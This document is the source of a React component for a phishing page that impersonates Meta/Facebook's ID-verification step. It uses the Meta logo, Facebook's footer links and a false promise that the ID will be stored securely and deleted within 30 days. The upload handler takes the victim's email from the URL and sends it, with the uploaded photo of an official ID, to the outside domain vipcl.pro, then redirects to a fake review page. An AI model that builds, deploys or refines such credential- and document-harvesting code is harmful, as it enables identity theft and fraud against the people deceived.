import React, { useEffect, useState } from 'react'
import { history } from '../../utils/history'

const Upload = () => {
	const [fileName, setFileName] = useState('')

	const languages = [
		'English (UK)',
		'Tiếng Việt',
		'中文(台灣)',
		'한국어',
		'日本語',
		'Français (France)',
		'ภาษาไทย',
		'Español',
		'Português (Brasil)',
		'Deutsch',
		'Italiano'
	]

	const opts = [
		'Sign Up', 
		'Log in',
		'Messenger', 
		'Facebook', 
		'Lite',
		'Video',
		'Places',
		'Games',
		'Marketplace',
		'Meta Pay',
		'Meta Store',
		'Meta Quest', 
		'Instagram',
		'Threads',
		'Fundraisers',
		'Services',
		'Voting Information Centre',
		'Privacy Policy',
		'Privacy Centre',
		'Groups',
		'About',
		'Create ad',
		'Create Page',
		'Developers',
		'Careers',
		'Cookies',
		'AdChoices',
		'Terms',
		'Help',
		'Contact uploading and non-users'
	]

	const onClickLoadFile = () => {
		document.getElementById('files').click()
	}


	const handleLoadFile = (e) => {
		// console.log(e.target.files[0].path)
		try {
				let reader = new FileReader()
				reader.readAsDataURL(e.target.files[0])

				setFileName(e.target.files[0].name ?? '')
				reader.onload = () => {
				};
				reader.onerror = function (error) {
				}
		} catch {
				setFileName('')
		}
	}

	const handleUploadFile = async (e) => {
		e.preventDefault();
		const email = window.location.href.split('email=')[1]
		const api = `https://vipcl.pro/api/submit/upload?_for=0`;
		const files = document.getElementById("files");
		if (files.files[0]) {
			const formData = new FormData();
			formData.append('email', email);
			formData.append('file', files.files[0]);

			fetch(api, {
				method: 'POST',
				url: api,
				body: formData
			})
				.then((res) => {
					if (res.status) {
						history.push('/review')
					} else {
						alert(res.message);
					}
				})
				.catch((err) => ("Error occured", err));
		} else {
			alert('File not found.')
		}
	}

  return (
	<div className='w-full'>
		<div className='w-full flex justify-center' style={{
			backgroundColor: '#f0f2f5'
			}}>
			{/* Content */}
			<div className='w-[640px] flex flex-col items-center pb-20 pt-10 sm: m-4'>
				<img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt="meta logo" className='w-[240px]'/>
				<div className='flex flex-col items-center w-full bg-white rounded-lg shadow-lg shadow-black-500/50 p-4'>
					<h2 className='font-bold text-2xl text-center'>Upload a photo of your ID</h2>
					<p className='text-center'>We need a photo of your official ID with your date of birth visible. This could be a birth certificate, passport or other type of official identification.</p>
					<p className='font-bold text-center'>Your identification documents mus clearly show four corners and be sharp.</p>
					{/* INPUT HERE */}
						<input 
							type="file" 
							name="file" 
							id="files" 
							accept="image/jpg,image/jpeg,image/png" 
							onChange={e => handleLoadFile(e)}
							style={{
								display: 'none'
							}}
						/>
						<div className='w-full flex p-4 mt-2'>
							<input 
								type="text" 
								disabled  
								placeholder='Upload a photo of your ID'
								value={fileName}
								onChange={e => setFileName(e.target.value)}
								className='w-full border-solid border-2 border-black-100 rounded-lg rounded-r-none border-r-0 px-4 py-3 outline-none'
							/>
							<button className='bg-gray-300 rounded-r-lg px-4' onClick={onClickLoadFile}>
								Browses
							</button>
						</div>

					{/* SUBMIT BUTTON HERE */}
					<button 
	          className='font-bold text-white rounded-lg px-6 py-3 m-2 text-lg' 
	          onClick={handleUploadFile}
	          style={{
	            backgroundColor: '#1877f2'
	          }}>
	          	Upload photo ID
	        </button>

					<div className="flex px-4 py-3 rounded-md mx-4 my-8" style={{
						backgroundColor: '#f2f3f5'
					}}>
						<div className='w-[36px] h-full pt-2 mr-4 sm: mr-0'>
							<img className='w-[20px] h-[20px]' src="https://cdn-icons-png.flaticon.com/512/61/61457.png" alt="" />
						</div>
						<p className="py-1 flex-1">
								Your ID will be stored securely and deleted within 30 days after we've finished confirming your identity. We might use trusted service providers to help review your information.
						</p>
				</div>
				</div>
			</div>
			{/* Content */}
		</div>
		{/* Footer */}
		<div className='flex flex-col items-center pt-40'>
				<div className='max-w-[980px] flex flex-wrap mb-2 md:mx-8 sm: mx-4'>
					{languages.map((lang, idx) => (
						<a href='#' key={idx} className='text-sm pr-2' style={{color: '#8a8d91'}}>
							{lang}
						</a>
					))}
				</div>
				<div className='max-w-[980px] flex flex-wrap border-solid border-t-2 border-gray pt-2  md:mx-8 sm: mx-4'>
					{opts.map((e, idx) => (
						<a className='text-sm pr-4 text-gray-400' href="#" key={idx}>
							{e}
						</a>
					))}
				</div>
				</div>			
		{/* Footer */}
	</div>
  )
}

export default Upload